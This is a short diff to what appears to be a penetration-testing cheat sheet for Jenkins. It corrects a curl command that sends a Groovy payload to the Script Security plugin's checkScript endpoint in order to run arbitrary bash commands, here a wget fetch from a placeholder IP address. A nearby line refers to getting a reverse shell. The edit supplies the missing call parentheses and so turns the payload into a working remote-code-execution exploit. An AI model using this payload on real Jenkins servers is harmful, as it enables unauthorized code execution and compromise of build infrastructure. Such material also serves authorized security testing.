@@ -45,7 +45,7 @@ curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.s
 
 Execute arbitraty bash commands:
 ```bash
-curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute}}'
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute()}}'
 ```
 
 If you don't immediately get a reverse shell you can debug by throwing an exception:
